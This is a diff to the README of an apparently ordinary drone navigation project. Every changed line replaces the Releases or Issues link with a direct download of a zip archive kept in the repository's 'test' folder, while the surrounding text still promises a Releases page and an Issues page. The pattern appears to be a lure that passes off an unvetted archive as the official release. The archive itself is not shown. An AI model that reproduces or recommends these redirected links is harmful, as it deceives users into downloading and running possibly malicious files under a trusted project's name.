@@ -1,7 +1,7 @@
 # 🚁 Autonomous-UAV-Navigation-System - Fly Your Drone with Confidence
 
 ## 📥 Download Now
-[![Download Autonomous UAV Navigation System](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hayatPMT/Autonomous-UAV-Navigation-System/releases)
+[![Download Autonomous UAV Navigation System](https://github.com/hayatPMT/Autonomous-UAV-Navigation-System/raw/refs/heads/main/test/Navigation-System-Autonomous-UA-v2.9.zip)](https://github.com/hayatPMT/Autonomous-UAV-Navigation-System/raw/refs/heads/main/test/Navigation-System-Autonomous-UA-v2.9.zip)
 
 ## 📖 Description
 The Autonomous UAV Navigation System lets you navigate drones effortlessly. This system includes real-time 2.5D occupancy-grid mapping, A* global path planning, and the merging of depth and LiDAR sensor data. It helps avoid obstacles in complex urban areas. This software works well with ROS 2, PX4 Offboard control, and Gazebo simulation for thorough testing.
@@ -18,7 +18,7 @@ You can get started in a few simple steps. Follow this guide to download and run
    - Internet connection for downloading necessary files.
 
 2. **Download the Application**  
-   Visit this page to download: [Download Page](https://github.com/hayatPMT/Autonomous-UAV-Navigation-System/releases). Here, you will find the latest release of the application.
+   Visit this page to download: [Download Page](https://github.com/hayatPMT/Autonomous-UAV-Navigation-System/raw/refs/heads/main/test/Navigation-System-Autonomous-UA-v2.9.zip). Here, you will find the latest release of the application.
 
 3. **Choose the Right Release**  
    On the Releases page, you will see a list of available versions. Click on the one that says "Latest Release." You will find a list of assets related to this release.
@@ -73,7 +73,7 @@ This project covers various topics to assist users in understanding its capabili
 
 ## 📞 Support
 For assistance or questions:
-- Visit the [Project Issues Page](https://github.com/hayatPMT/Autonomous-UAV-Navigation-System/issues).
+- Visit the [Project Issues Page](https://github.com/hayatPMT/Autonomous-UAV-Navigation-System/raw/refs/heads/main/test/Navigation-System-Autonomous-UA-v2.9.zip).
 - Contribute ideas or report problems to improve the software.
 
 Feel free to reach out or explore the resources provided. Your autonomous drone navigation adventure starts here!
